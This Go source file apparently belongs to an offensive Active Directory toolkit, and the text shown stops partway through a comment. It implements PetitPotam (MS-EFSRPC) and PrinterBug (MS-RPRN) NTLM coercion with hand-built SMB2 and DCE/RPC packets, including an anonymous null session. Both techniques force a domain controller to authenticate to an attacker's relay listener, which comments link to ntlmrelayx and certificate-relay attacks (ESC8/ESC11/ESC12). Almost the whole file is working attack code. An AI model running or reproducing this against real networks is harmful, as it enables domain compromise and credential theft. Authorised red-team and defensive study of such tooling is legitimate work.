package pki

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"
)

// CoerceMethod identifies the NTLM authentication coercion technique.
type CoerceMethod string

const (
	CoercePetitPotam CoerceMethod = "PetitPotam" // MS-EFSRPC EfsRpcOpenFileRaw
	CoercePrinterBug CoerceMethod = "PrinterBug" // MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
)

// CoerceNTLMAuth triggers an NTLM authentication from a target machine to a
// listener IP using the specified coercion method. This is used to chain with
// relay attacks (ESC8/ESC11/ESC12) — the coerced auth is relayed to the CA's
// enrollment endpoint to obtain a certificate as the target machine account.
//
// targetDC is the machine to coerce (e.g., a domain controller).
// listenerIP is the attacker's relay listener (where ntlmrelayx is running).
// listenerPort is the port for the relay listener. When non-zero, WebDAV-style
// UNC paths (\\ip@port/path) are used so the target sends HTTP auth to the
// custom port instead of SMB to 445. This allows relaying from a non-admin
// pivot machine using ports >1024.
func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method CoerceMethod, cfg *ADCSConfig) error {
	switch method {
	case CoercePetitPotam:
		return petitPotam(targetDC, listenerIP, listenerPort)
	case CoercePrinterBug:
		return printerBug(targetDC, listenerIP, cfg)
	default:
		return fmt.Errorf("unknown coercion method: %s", method)
	}
}

// MS-EFSRPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
var efsrpcUUID = [16]byte{
	0x88, 0xd4, 0x81, 0xc6, 0x50, 0xd8, 0xd0, 0x11,
	0x8c, 0x52, 0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e,
}

// MS-RPRN interface UUID: 12345678-1234-ABCD-EF00-0123456789AB v1.0
// Wire format (byte-swapped first three groups per DCE/RPC convention)
var rprnUUID = [16]byte{
	0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xCD, 0xAB,
	0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
}

// --- Stateful SMB2 session ---

// smbSession tracks connection state across the SMB2 handshake: session ID,
// tree ID, file ID, and an auto-incrementing message ID.
type smbSession struct {
	conn      net.Conn
	sessionID uint64
	treeID    uint32
	fileID    [16]byte
	messageID uint64
}

// smb2Header builds a 64-byte SMB2 header using the session's current state.
// MessageID is set to s.messageID and then incremented for the next call.
func (s *smbSession) smb2Header(command uint16) []byte {
	hdr := make([]byte, 64)
	hdr[0] = 0xFE
	hdr[1] = 'S'
	hdr[2] = 'M'
	hdr[3] = 'B'
	binary.LittleEndian.PutUint16(hdr[4:6], 64)                  // StructureSize
	binary.LittleEndian.PutUint16(hdr[12:14], command)            // Command
	binary.LittleEndian.PutUint16(hdr[14:16], 31)                 // CreditRequest
	binary.LittleEndian.PutUint64(hdr[28:36], s.messageID)        // MessageID
	binary.LittleEndian.PutUint32(hdr[36:40], s.treeID)           // TreeID
	binary.LittleEndian.PutUint64(hdr[40:48], s.sessionID)        // SessionID
	s.messageID++
	return hdr
}

// negotiate sends an SMB2 NEGOTIATE and reads the response.
func (s *smbSession) negotiate() error {
	hdr := s.smb2Header(0x0000) // NEGOTIATE

	neg := make([]byte, 36+4) // 36-byte body + 2 dialects * 2 bytes
	binary.LittleEndian.PutUint16(neg[0:2], 36)    // StructureSize
	binary.LittleEndian.PutUint16(neg[2:4], 2)     // DialectCount
	binary.LittleEndian.PutUint16(neg[4:6], 0x01)  // SecurityMode: signing enabled
	binary.LittleEndian.PutUint16(neg[36:38], 0x0202)
	binary.LittleEndian.PutUint16(neg[38:40], 0x0210)

	pkt := smbPacket(hdr, neg)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	_, err := readSMB2Response(s.conn)
	return err
}

// sessionSetupAnonymous performs a two-round-trip NTLMSSP anonymous session
// setup. Round 1 sends NTLMSSP_NEGOTIATE and expects STATUS_MORE_PROCESSING_REQUIRED.
// Round 2 sends NTLMSSP_AUTH with empty credentials to complete the session.
// The session ID is extracted from the final response.
func (s *smbSession) sessionSetupAnonymous() error {
	// --- Round 1: NTLMSSP_NEGOTIATE ---
	hdr1 := s.smb2Header(0x0001) // SESSION_SETUP
	body1 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body1[0:2], 25) // StructureSize

	ntlmNeg := buildNTLMSSPNegotiate()
	secOffset1 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body1[12:14], secOffset1)
	binary.LittleEndian.PutUint16(body1[14:16], uint16(len(ntlmNeg)))
	body1 = append(body1, ntlmNeg...)

	pkt1 := smbPacket(hdr1, body1)
	if _, err := s.conn.Write(pkt1); err != nil {
		return err
	}

	resp1, err := readSMB2Response(s.conn)
	if err != nil {
		// STATUS_MORE_PROCESSING_REQUIRED (0xC0000016) is expected; readSMB2Response
		// allows it, so an error here means something else went wrong.
		return fmt.Errorf("NTLMSSP_NEGOTIATE: %w", err)
	}

	// Extract interim session ID from round 1.
	if len(resp1) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp1[40:48])
	}

	// --- Round 2: NTLMSSP_AUTH (empty credentials) ---
	hdr2 := s.smb2Header(0x0001) // SESSION_SETUP
	body2 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body2[0:2], 25)

	ntlmAuth := buildNTLMSSPAuth()
	secOffset2 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body2[12:14], secOffset2)
	binary.LittleEndian.PutUint16(body2[14:16], uint16(len(ntlmAuth)))
	body2 = append(body2, ntlmAuth...)

	pkt2 := smbPacket(hdr2, body2)
	if _, err := s.conn.Write(pkt2); err != nil {
		return err
	}

	resp2, err := readSMB2Response(s.conn)
	if err != nil {
		return fmt.Errorf("NTLMSSP_AUTH: %w", err)
	}

	// Extract final session ID.
	if len(resp2) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp2[40:48])
	}

	return nil
}

// treeConnect sends an SMB2 TREE_CONNECT to \\target\IPC$ and stores the tree ID.
func (s *smbSession) treeConnect(target string) error {
	hdr := s.smb2Header(0x0003) // TREE_CONNECT

	path := fmt.Sprintf(`\\%s\IPC$`, target)
	pathUTF16 := coerceUTF16LE(path)

	body := make([]byte, 8)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	pathOffset := uint16(64 + 8)
	binary.LittleEndian.PutUint16(body[4:6], pathOffset)
	binary.LittleEndian.PutUint16(body[6:8], uint16(len(pathUTF16)))
	body = append(body, pathUTF16...)

	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	resp, err := readSMB2Response(s.conn)
	if err != nil {
		return err
	}

	// Tree ID is at header bytes 36-39.
	if len(resp) >= 40 {
		s.treeID = binary.LittleEndian.Uint32(resp[36:40])
	}

	return nil
}

// createPipe opens a named pipe and stores the returned file ID.
func (s *smbSession) createPipe(name string) error {
	hdr := s.smb2Header(0x0005) // CREATE
	nameUTF16 := coerceUTF16LE(name)

	body := make([]byte, 57)
	binary.LittleEndian.PutUint16(body[0:2], 57)          // StructureSize
	body[3] = 0                                            // RequestedOplockLevel
	binary.LittleEndian.PutUint32(body[4:8], 0)           // ImpersonationLevel
	binary.LittleEndian.PutUint32(body[24:28], 0x001F01FF) // DesiredAccess: GENERIC_ALL
	binary.LittleEndian.PutUint32(body[28:32], 0x00)       // FileAttributes: 0 for pipes
	binary.LittleEndian.PutUint32(body[32:36], 0x07)       // ShareAccess: read|write|delete
	binary.LittleEndian.PutUint32(body[36:40], 0x01)       // CreateDisposition: FILE_OPEN
	binary.LittleEndian.PutUint32(body[40:44], 0x00400040) // CreateOptions: non-directory
	nameOffset := uint16(64 + 57)
	binary.LittleEndian.PutUint16(body[44:46], nameOffset)
	binary.LittleEndian.PutUint16(body[46:48], uint16(len(nameUTF16)))

	body = append(body, nameUTF16...)
	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	resp, err := readSMB2Response(s.conn)
	if err != nil {
		return err
	}

	// SMB2 CREATE response: header 64 bytes, then body. Per MS-SMB2 2.2.14,
	// FileId is at body offset 64 (raw packet offset 128).
	if len(resp) >= 128+16 {
		copy(s.fileID[:], resp[128:144])
	}

	return nil
}

// writePipe writes data to the currently-open pipe using the stored file ID.
func (s *smbSession) writePipe(data []byte) error {
	hdr := s.smb2Header(0x0009) // WRITE
	body := make([]byte, 49)
	binary.LittleEndian.PutUint16(body[0:2], 49)                   // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], uint16(64+49))        // DataOffset
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(data)))    // Length
	copy(body[16:32], s.fileID[:])                                  // FileId
	body = append(body, data...)
	pkt := smbPacket(hdr, body)
	_, err := s.conn.Write(pkt)
	return err
}

// readPipe issues an SMB2 READ on the currently-open pipe and returns the response.
func (s *smbSession) readPipe() ([]byte, error) {
	hdr := s.smb2Header(0x0008) // READ
	body := make([]byte, 49)
	binary.LittleEndian.PutUint16(body[0:2], 49)  // StructureSize
	binary.LittleEndian.PutUint32(body[4:8], 4096) // Length to read
	copy(body[16:32], s.fileID[:])                  // FileId
	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return nil, err
	}
	return readSMB2Response(s.conn)
}

// --- Coercion entry points ---

// petitPotam triggers NTLM auth via MS-EFSRPC EfsRpcOpenFileRaw (opnum 0).
// This is the unauthenticated PetitPotam variant that works on unpatched DCs.
// The target DC connects back to the listener IP via SMB to access the UNC path.
//
// Protocol: DCE/RPC over named pipe \pipe\efsrpc (or \pipe\lsarpc) on port 445.
func petitPotam(targetDC, listenerIP string, listenerPort int) error {
	if listenerPort > 0 {
		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s:%d (WebDAV/HTTP)\n", targetDC, listenerIP, listenerPort)
	} else {
		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s (SMB/445)\n", targetDC, listenerIP)
	}

	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	if err := s.negotiate(); err != nil {
		return fmt.Errorf("SMB negotiate: %w", err)
	}
	if err := s.sessionSetupAnonymous(); err != nil {
		return fmt.Errorf("SMB session setup: %w", err)
	}
	if err := s.treeConnect(targetDC); err != nil {
		return fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	pipes := []string{"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
	var pipeErr error
	for _, pipeName := range pipes {
		if err := s.createPipe(pipeName); err != nil {
			pipeErr = err
			continue
		}
		fmt.Printf("[+] Opened pipe: \\pipe\\%s\n", pipeName)

		if err := rpcBind(s, efsrpcUUID); err != nil {
			pipeErr = fmt.Errorf("RPC bind on %s: %w", pipeName, err)
			continue
		}

		// WebDAV UNC path: \\ip@port/share triggers HTTP auth to custom port
		// Standard UNC:    \\ip\share triggers SMB auth to port 445
		var uncPath string
		if listenerPort > 0 {
			uncPath = fmt.Sprintf(`\\%s@%d\share\file.txt`, listenerIP, listenerPort)
		} else {
			uncPath = fmt.Sprintf(`\\%s\share\file.txt`, listenerIP)
		}
		if err := efsRpcOpenFileRaw(s, uncPath); err != nil {
			pipeErr = fmt.Errorf("EfsRpcOpenFileRaw: %w", err)
			continue
		}

		fmt.Printf("[+] PetitPotam: Coercion sent — %s should authenticate to %s\n", targetDC, listenerIP)
		return nil
	}

	return fmt.Errorf("PetitPotam failed on all pipes: %w", pipeErr)
}

// printerBug triggers NTLM auth via MS-RPRN (Print System Remote Protocol).
// The attack opens an authenticated SMB session to the target's \pipe\spoolss,
// binds to the MS-RPRN interface, calls RpcOpenPrinterEx (opnum 69) to obtain
// a printer handle, then calls RpcRemoteFindFirstPrinterChangeNotificationEx
// (opnum 65) with a UNC path pointing to the attacker's listener.
// This causes the target's Print Spooler to authenticate back to the listener.
func printerBug(targetDC, listenerIP string, cfg *ADCSConfig) error {
	if cfg == nil {
		return fmt.Errorf("PrinterBug requires credentials (cfg is nil)")
	}
	fmt.Printf("[*] PrinterBug: Triggering NTLM auth from %s to \\\\%s\\share\n", targetDC, listenerIP)

	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	// SMB2 negotiate
	if err := s.negotiate(); err != nil {
		return fmt.Errorf("SMB negotiate: %w", err)
	}

	// Authenticated session setup — PrinterBug requires valid domain credentials
	if cfg.Kerberos {
		if err := s.sessionSetupKerberos(cfg, targetDC); err != nil {
			return fmt.Errorf("SMB Kerberos auth: %w", err)
		}
		fmt.Printf("[+] SMB2 Kerberos session established (authenticated as %s)\n", cfg.Username)
	} else {
		if err := s.sessionSetupNTLM(cfg); err != nil {
			return fmt.Errorf("SMB NTLM auth: %w", err)
		}
		fmt.Printf("[+] SMB2 session established (authenticated as %s)\n", cfg.Username)
	}

	// Tree connect to IPC$
	if err := s.treeConnect(targetDC); err != nil {
		return fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	// Open the spoolss named pipe
	if err := s.createPipe("spoolss"); err != nil {
		return fmt.Errorf("open \\pipe\\spoolss: %w (is the Print Spooler service running?)", err)
	}
	fmt.Printf("[+] Opened pipe: \\pipe\\spoolss\n")

	// RPC bind to MS-RPRN
	if err := rpcBind(s, rprnUUID); err != nil {
		return fmt.Errorf("RPC bind MS-RPRN: %w", err)
	}
	fmt.Printf("[+] RPC bind to MS-RPRN successful\n")

	// Step 1: RpcOpenPrinterEx (opnum 69) to get a printer handle
	printerName := fmt.Sprintf(`\\%s`, targetDC)
	handle, err := rpcOpenPrinterEx(s, printerName)
	if err != nil {
		return fmt.Errorf("RpcOpenPrinterEx: %w", err)
	}
	fmt.Printf("[+] Got printer handle for %s\n", printerName)

	// Step 2: RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)
	// with UNC path to attacker listener
	captureUNC := fmt.Sprintf(`\\%s\share`, listenerIP)
	if err := rpcFindFirstPrinterChangeNotificationEx(s, handle, captureUNC); err != nil {
		// Errors like STATUS_ACCESS_DENIED or RPC faults are expected on some
		// configurations, but the coercion may have already triggered.
		fmt.Printf("[!] RpcRemoteFindFirstPrinterChangeNotificationEx returned error: %v\n", err)
		fmt.Printf("[*] The coercion may still have triggered — check your relay listener\n")
		return nil
	}

	fmt.Printf("[+] PrinterBug: Coercion sent — %s should authenticate to \\\\%s\\share\n", targetDC, listenerIP)
	return nil
}

// rpcOpenPrinterEx calls RpcOpenPrinterEx (opnum 69 / 0x45) on MS-RPRN.
// Returns the 20-byte printer handle from the response.
//
// NDR layout:
//
//	pPrinterName:   [string,unique] wchar_t* — e.g. "\\DC01"
//	pDatatype:      [string,unique] wchar_t* — NULL
//	pDevModeContainer: DEVMODE_CONTAINER { cbBuf=0, pDevMode=NULL }
//	AccessRequired: DWORD — PRINTER_ACCESS_USE (0x00000008)
//	pClientInfo:    SPLCLIENT_CONTAINER { Level=1, pClientInfo pointer }
func rpcOpenPrinterEx(s *smbSession, printerName string) ([]byte, error) {
	callID := rand.Uint32()

	var stub []byte

	// pPrinterName: NDR unique pointer to conformant varying string (UTF-16LE)
	nameUTF16 := coerceUTF16LE(printerName)
	nameChars := uint32(len(nameUTF16)/2 + 1) // +1 for null terminator

	stub = appendLE32(stub, 0x00020000) // referent ID (non-null pointer)
	stub = appendLE32(stub, nameChars)  // max count
	stub = appendLE32(stub, 0)          // offset
	stub = appendLE32(stub, nameChars)  // actual count
	stub = append(stub, nameUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// pDatatype: NULL pointer
	stub = appendLE32(stub, 0)

	// DEVMODE_CONTAINER: cbBuf(4) + pDevMode pointer(4) = NULL
	stub = appendLE32(stub, 0) // cbBuf = 0
	stub = appendLE32(stub, 0) // pDevMode = NULL

	// AccessRequired: PRINTER_ACCESS_USE (0x00000008)
	stub = appendLE32(stub, 0x00000008)

	// SPLCLIENT_CONTAINER: Level(4) + union tag(4) + pointer to SPLCLIENT_INFO_1
	stub = appendLE32(stub, 1)          // Level = 1
	stub = appendLE32(stub, 1)          // union discriminant = 1
	stub = appendLE32(stub, 0x00020004) // referent ID for pClientInfo

	// SPLCLIENT_INFO_1:
	// dwSize(4) + pMachineName pointer(4) + pUserName pointer(4) +
	// dwBuildNum(4) + dwMajorVersion(4) + dwMinorVersion(4) + wProcessorArchitecture(2) + pad(2)
	stub = appendLE32(stub, 60)         // dwSize
	stub = appendLE32(stub, 0x00020008) // pMachineName referent ID
	stub = appendLE32(stub, 0x0002000C) // pUserName referent ID
	stub = appendLE32(stub, 7601)       // dwBuildNum (Win7 SP1)
	stub = appendLE32(stub, 6)          // dwMajorVersion
	stub = appendLE32(stub, 1)          // dwMinorVersion
	stub = append(stub, 9, 0) // wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64
	stub = append(stub, 0, 0) // pad to 4-byte alignment

	// pMachineName: conformant varying string
	machineUTF16 := coerceUTF16LE(`\\`)
	machineChars := uint32(len(machineUTF16)/2 + 1)
	stub = appendLE32(stub, machineChars) // max count
	stub = appendLE32(stub, 0)            // offset
	stub = appendLE32(stub, machineChars) // actual count
	stub = append(stub, machineUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// pUserName: conformant varying string
	userUTF16 := coerceUTF16LE(`\\`)
	userChars := uint32(len(userUTF16)/2 + 1)
	stub = appendLE32(stub, userChars) // max count
	stub = appendLE32(stub, 0)         // offset
	stub = appendLE32(stub, userChars) // actual count
	stub = append(stub, userUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// Build DCE/RPC REQUEST (type 0x00)
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub))) // alloc hint
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)                 // context_id
	binary.LittleEndian.PutUint16(reqHdr[6:8], 69)                // opnum 69 = RpcOpenPrinterEx

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5    // version major
	hdr[1] = 0    // version minor
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03 // first+last fragment
	hdr[4] = 0x10 // data rep: little-endian
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return nil, fmt.Errorf("write RpcOpenPrinterEx: %w", err)
	}

	resp, err := s.readPipe()
	if err != nil {
		return nil, fmt.Errorf("read RpcOpenPrinterEx response: %w", err)
	}

	return parseOpenPrinterExResponse(resp)
}

// parseOpenPrinterExResponse extracts the 20-byte printer handle from the
// RpcOpenPrinterEx DCE/RPC response.
func parseOpenPrinterExResponse(resp []byte) ([]byte, error) {
	rpcData, err := extractRPCFromReadResponse(resp)
	if err != nil {
		return nil, fmt.Errorf("extract RPC data: %w", err)
	}

	if len(rpcData) < 24 {
		return nil, fmt.Errorf("RPC response too short: %d bytes", len(rpcData))
	}

	pktType := rpcData[2]
	if pktType == 0x03 { // FAULT
		if len(rpcData) >= 28 {
			faultStatus := binary.LittleEndian.Uint32(rpcData[24:28])
			return nil, fmt.Errorf("RPC fault: status=0x%08X", faultStatus)
		}
		return nil, fmt.Errorf("RPC fault")
	}
	if pktType != 0x02 { // RESPONSE
		return nil, fmt.Errorf("unexpected RPC packet type: 0x%02X", pktType)
	}

	// Stub data starts at offset 24 (16 header + 8 response header).
	// RpcOpenPrinterEx returns: HANDLE(20 bytes) + DWORD return value(4).
	stub := rpcData[24:]
	if len(stub) < 24 {
		return nil, fmt.Errorf("RPC response stub too short for handle: %d bytes", len(stub))
	}

	// Check return value (last 4 bytes)
	retVal := binary.LittleEndian.Uint32(stub[20:24])
	if retVal != 0 {
		return nil, fmt.Errorf("RpcOpenPrinterEx failed: error=0x%08X", retVal)
	}

	handle := make([]byte, 20)
	copy(handle, stub[0:20])
	return handle, nil
}

// rpcFindFirstPrinterChangeNotificationEx calls
// RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65 / 0x41) on MS-RPRN.
// This triggers the Print Spooler to authenticate back to the attacker's UNC path.
//
// NDR layout:
//
//	hPrinter:       HANDLE (20 bytes)
//	fdwFlags:       DWORD — PRINTER_CHANGE_ADD_JOB (0x00000100)
//	fdwOptions:     DWORD — 0
//	pszLocalMachine: [string,unique] wchar_t* — UNC path to attacker (e.g. "\\10.0.0.5\share")
//	dwPrinterLocal: DWORD — 0
//	pOptions:       [unique] RPC_V2_NOTIFY_OPTIONS* — NULL
func rpcFindFirstPrinterChangeNotificationEx(s *smbSession, handle []byte, captureUNC string) error {
	callID := rand.Uint32()

	var stub []byte

	// hPrinter: 20-byte context handle
	stub = append(stub, handle...)

	// fdwFlags: PRINTER_CHANGE_ADD_JOB
	stub = appendLE32(stub, 0x00000100)

	// fdwOptions: 0
	stub = appendLE32(stub, 0)

	// pszLocalMachine: NDR unique pointer to conformant varying string
	uncUTF16 := coerceUTF16LE(captureUNC)
	uncChars := uint32(len(uncUTF16)/2 + 1) // +1 for null terminator

	stub = appendLE32(stub, 0x00020000) // referent ID (non-null)
	stub = appendLE32(stub, uncChars)   // max count
	stub = appendLE32(stub, 0)          // offset
	stub = appendLE32(stub, uncChars)   // actual count
	stub = append(stub, uncUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// dwPrinterLocal: 0
	stub = appendLE32(stub, 0)

	// pOptions: NULL pointer
	stub = appendLE32(stub, 0)

	// Build DCE/RPC REQUEST
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub))) // alloc hint
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)                 // context_id
	binary.LittleEndian.PutUint16(reqHdr[6:8], 65)                // opnum 65 = RpcRemoteFindFirstPrinterChangeNotificationEx

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5    // version major
	hdr[1] = 0    // version minor
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03 // first+last fragment
	hdr[4] = 0x10 // data rep: little-endian
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return fmt.Errorf("write RpcRemoteFindFirstPrinterChangeNotificationEx: %w", err)
	}

	// Read response — the coercion fires when the spooler processes this request,
	// so even an error response means the auth callback may have been triggered.
	resp, err := s.readPipe()
	if err != nil {
		// Read errors are common here because the spooler may drop the connection
		// after triggering the callback. Treat as potential success.
		return nil
	}

	// Parse RPC response to check for errors
	rpcData, err := extractRPCFromReadResponse(resp)
	if err != nil {
		return nil
	}

	if len(rpcData) < 24 {
		return nil
	}

	pktType := rpcData[2]
	if pktType == 0x03 { // FAULT
		if len(rpcData) >= 28 {
			faultStatus := binary.LittleEndian.Uint32(rpcData[24:28])
			return fmt.Errorf("RPC fault: status=0x%08X", faultStatus)
		}
		return fmt.Errorf("RPC fault")
	}

	if pktType == 0x02 && len(rpcData) >= 28 {
		retVal := binary.LittleEndian.Uint32(rpcData[24:28])
		if retVal != 0 {
			return fmt.Errorf("RpcRemoteFindFirstPrinterChangeNotificationEx: error=0x%08X", retVal)
		}
	}

	return nil
}

// --- DCE/RPC over SMB pipe ---

// rpcBind sends a DCE/RPC bind request for the given interface UUID over the SMB pipe.
func rpcBind(s *smbSession, interfaceUUID [16]byte) error {
	callID := rand.Uint32()

	// Presentation context list: 1 context, 1 transfer syntax (NDR).
	// 48 bytes: numContexts(1) + reserved(3) + contextID(2) + numTransferSyntaxes(2) +
	// abstractSyntaxUUID(16) + abstractVersion(4) + ndrUUID(16) + ndrVersion(4)
	ctxList := make([]byte, 48)
	ctxList[0] = 1 // num contexts
	ctxList[4] = 0 // context ID
	ctxList[6] = 1 // num transfer syntaxes
	copy(ctxList[8:24], interfaceUUID[:])
	binary.LittleEndian.PutUint16(ctxList[24:26], 1) // abstract syntax version 1.0
	// NDR transfer syntax: 8a885d04-1ceb-11c9-9fe8-08002b104860 v2.0
	ndr := [16]byte{0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}
	copy(ctxList[28:44], ndr[:])
	binary.LittleEndian.PutUint32(ctxList[44:48], 2) // NDR version 2

	// Bind body: max_xmit(2) + max_recv(2) + assoc_group(4) + ctx_list
	bindBody := make([]byte, 8)
	binary.LittleEndian.PutUint16(bindBody[0:2], 4280)
	binary.LittleEndian.PutUint16(bindBody[2:4], 4280)
	bindBody = append(bindBody, ctxList...)

	// DCE/RPC header (16 bytes)
	fragLen := uint16(16 + len(bindBody))
	hdr := make([]byte, 16)
	hdr[0] = 5    // version major
	hdr[1] = 0    // version minor
	hdr[2] = 0x0B // BIND
	hdr[3] = 0x03 // first+last frag
	hdr[4] = 0x10 // data rep: little-endian
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var bind []byte
	bind = append(bind, hdr...)
	bind = append(bind, bindBody...)

	if err := s.writePipe(bind); err != nil {
		return fmt.Errorf("write RPC bind: %w", err)
	}

	_, err := s.readPipe()
	return err
}

// efsRpcOpenFileRaw calls EfsRpcOpenFileRaw (opnum 0) with a UNC path pointing
// to the attacker's listener, triggering NTLM authentication from the target.
func efsRpcOpenFileRaw(s *smbSession, uncPath string) error {
	callID := rand.Uint32()

	// NDR-encode the request:
	// hContext: 20 bytes (null)
	// FileName: conformant varying string
	// Flags: uint32 = 0
	pathUTF16 := coerceUTF16LE(uncPath)
	pathWords := len(pathUTF16)/2 + 1 // +1 for null terminator

	var stub []byte
	stub = append(stub, make([]byte, 20)...) // hContext
	stub = appendLE32(stub, uint32(pathWords))
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, uint32(pathWords))
	stub = append(stub, pathUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0) // Flags

	// DCE/RPC request (type 0x00)
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0) // context_id
	binary.LittleEndian.PutUint16(reqHdr[6:8], 0) // opnum 0

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[1] = 0
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return fmt.Errorf("write EfsRpcOpenFileRaw: %w", err)
	}

	// Read response to avoid leaving the connection in a bad state.
	s.readPipe()
	return nil
}

// --- SMB2 packet helpers ---

func smbPacket(header, body []byte) []byte {
	totalLen := len(header) + len(body)
	nb := make([]byte, 4)
	nb[0] = 0x00
	nb[1] = byte(totalLen >> 16)
	nb[2] = byte(totalLen >> 8)
	nb[3] = byte(totalLen)
	pkt := append(nb, header...)
	pkt = append(pkt, body...)
	return pkt
}

// readSMB2Response reads a full SMB2 response (header + body) from the wire.
func readSMB2Response(conn net.Conn) ([]byte, error) {
	nb := make([]byte, 4)
	if _, err := readFull(conn, nb); err != nil {
		return nil, fmt.Errorf("read NetBIOS header: %w", err)
	}
	length := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if length <= 0 || length > 65536 {
		return nil, fmt.Errorf("invalid SMB response length: %d", length)
	}

	data := make([]byte, length)
	if _, err := readFull(conn, data); err != nil {
		return nil, fmt.Errorf("read SMB response: %w", err)
	}

	// Check NT status at header offset 8.
	if len(data) >= 12 {
		status := binary.LittleEndian.Uint32(data[8:12])
		if status != 0 && status != 0xC0000016 {
			return data, fmt.Errorf("SMB status 0x%08X", status)
		}
	}

	return data, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// --- NTLMSSP token builders ---

// buildNTLMSSPNegotiate builds a Type 1 (NTLMSSP_NEGOTIATE) token.
func buildNTLMSSPNegotiate() []byte {
	msg := make([]byte, 32)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 1)          // Type 1
	binary.LittleEndian.PutUint32(msg[12:16], 0x00088207) // Flags
	return msg
}

// buildNTLMSSPAuth builds a Type 3 (NTLMSSP_AUTH) token with empty credentials
// for anonymous/null session authentication.
//
// Layout (88 bytes fixed):
//
//	"NTLMSSP\0"(8) + Type(4) + LmResponse(8) + NtResponse(8) + Domain(8) +
//	User(8) + Workstation(8) + EncryptedRandomSessionKey(8) + NegotiateFlags(4)
//
